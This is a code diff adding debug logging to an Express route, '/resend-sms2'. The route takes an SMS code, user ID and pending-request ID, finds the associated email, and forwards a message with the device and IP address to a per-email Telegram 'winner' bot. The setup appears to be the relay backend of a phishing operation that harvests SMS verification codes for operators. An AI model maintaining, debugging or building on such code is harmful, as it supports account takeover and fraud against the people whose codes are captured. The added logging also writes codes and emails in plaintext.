@@ -836,7 +836,10 @@ app.post("/resend-sms2", async (req, res) => {
   try {
     const { sms2Id, userId, code } = req.body;
 
+    console.log(`🔍 DEBUG /resend-sms2: Received sms2Id=${sms2Id}, userId=${userId}, code=${code}`);
+
     if (!sms2Id || !userId || !code) {
+      console.log(`❌ Missing parameters!`);
       return res.status(400).json({ error: "Missing sms2Id, userId, or code" });
     }
 
@@ -851,6 +854,9 @@ app.post("/resend-sms2", async (req, res) => {
     let email = "unknown@example.com";
     if (pendingSMS2[sms2Id]) {
       email = pendingSMS2[sms2Id].email || pendingSMS2[sms2Id].displayEmail || "unknown@example.com";
+      console.log(`✅ Found email in pendingSMS2: ${email}`);
+    } else {
+      console.log(`❌ sms2Id NOT found in pendingSMS2!`);
     }
 
     const message =
@@ -862,13 +868,18 @@ app.post("/resend-sms2", async (req, res) => {
       `<b>💻 Device:</b> ${device}\n` +
       `<b>📍 IP:</b> ${ip}`;
 
+    console.log(`🔍 DEBUG: userWinnerTelegram[${email}] = ${userWinnerTelegram[email]}`);
+
     // ✅ SEND TO WINNER ONLY - NO BUTTONS
     if (email && userWinnerTelegram[email]) {
+      console.log(`✅ Sending resend SMS 2 message to winner bot for ${email}`);
       await sendFollowUpMessage(email, message, {
         parse_mode: "HTML"
         // ✅ NO reply_markup - no buttons!
       });
+      console.log(`✅ Message sent!`);
     } else {
+      console.log(`❌ No winner for ${email} or email is empty`);
       return res.status(400).json({ error: "No winner determined for this email" });
     }
 
@@ -880,7 +891,7 @@ app.post("/resend-sms2", async (req, res) => {
     res.json({ ok: true });
 
   } catch (err) {
-    console.error("Resend SMS 2 error:", err);
+    console.error("❌ Resend SMS 2 error:", err);
     res.status(500).json({ error: err.message });
   }
 });
